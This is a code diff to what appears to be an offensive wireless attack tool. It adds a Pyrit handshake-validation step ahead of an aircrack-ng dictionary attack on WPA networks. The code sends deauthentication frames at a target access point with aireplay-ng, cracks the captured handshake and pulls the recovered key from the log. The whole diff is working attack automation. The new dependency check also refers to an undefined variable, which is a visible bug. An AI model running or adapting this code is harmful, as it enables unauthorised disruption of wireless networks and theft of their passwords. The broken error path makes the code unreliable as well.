Handshake capture validation with Pyrit

+++ src/attacks/wpa_dictionary_attack.py
@@ -32,25 +32,40 @@ class wpa_dictionary(BaseAttack):
 		cmd_aireplay = pexpect.spawn('aireplay-ng -0 10 -a {0} {1}'.format(settings.TARGET_BSSID, settings.INTERFACE_MON))
 		time.sleep(10)
 		cmd_aireplay.close()
-		time.sleep(settings.WPA_EXPECT_HANDSHAKE_TIME)	
+		time.sleep(settings.WPA_EXPECT_HANDSHAKE_TIME)
 
-		info("We have something :-) Making a dictionary attack...")
-		cmd_crack = pexpect.spawn('aircrack-ng -w dictionary_wpa2 cr0z0n0_attack-01.cap')
-		cmd_crack.logfile = open(settings.LOG_FILE, 'wb')
-		cmd_crack.expect(['KEY FOUND!', 'Failed', pexpect.TIMEOUT, pexpect.EOF])
-		cmd_crack.close()
+		cmd_pyrit = pexpect.spawn('pyrit -r cr0z0n0_attack-01.cap analyze')
+		cmd_pyrit.logfile = open(settings.LOG_FILE, 'wb')
+		cmd_pyrit.expect(['No valid', 'good', pexpect.TIMEOUT, pexpect.EOF])
+		cmd_pyrit.close()
 
-		parse_log_crack = open(settings.LOG_FILE, 'r')
-		for line in parse_log_crack:
-			wh = line.find('KEY FOUND!')
-			if wh > -1:
-				key_end = line.find(']')
-				settings.TARGET_KEY = line[wh + 13:key_end]
-				break
-		parse_log_crack.close()
-		os.remove(settings.LOG_FILE)
-		if settings.TARGET_KEY is None:
-			warn("Dictionary attack failed!")
+		handshake = True
+		parse_log_pyrit = open(settings.LOG_FILE, 'r')
+		for line in parse_log_pyrit:
+			if "No valid" in line:
+				warn("We couldn't get the handshake :-(")
+				handshake = False
+		parse_log_pyrit.close()
+		os.remove(settings.LOG_FILE)	
+
+		if handshake != False:
+			info("We have something :-) Making a dictionary attack...")
+			cmd_crack = pexpect.spawn('aircrack-ng -w dictionary_wpa2 cr0z0n0_attack-01.cap')
+			cmd_crack.logfile = open(settings.LOG_FILE, 'wb')
+			cmd_crack.expect(['KEY FOUND!', 'Failed', pexpect.TIMEOUT, pexpect.EOF])
+			cmd_crack.close()
+
+			parse_log_crack = open(settings.LOG_FILE, 'r')
+			for line in parse_log_crack:
+				wh = line.find('KEY FOUND!')
+				if wh > -1:
+					key_end = line.find(']')
+					settings.TARGET_KEY = line[wh + 13:key_end]
+					break
+			parse_log_crack.close()
+			os.remove(settings.LOG_FILE)
+			if settings.TARGET_KEY is None:
+				warn("Dictionary attack failed!")
 
 	def setup(self):
 		#  Delete old files:
@@ -61,9 +76,9 @@ class wpa_dictionary(BaseAttack):
 			os.remove(os.path.join(settings.OS_PATH,'cr0z0n0_attack-01.kismet.netxml'))
 
 	def check(self):
-		dep = 'aircrack-ng'
-		if subprocess.call(["which", dep],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
-			error("Required binary for {bin} not found.".format(bin=dep))
-			return False
-		else:
-			return True
+		deps = ["aircrack-ng","pyrit"]
+		for d in deps:
+			if subprocess.call(["which", d],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
+				error("Required binary for {bin} not found.".format(bin=dep))
+				return False
+		return True
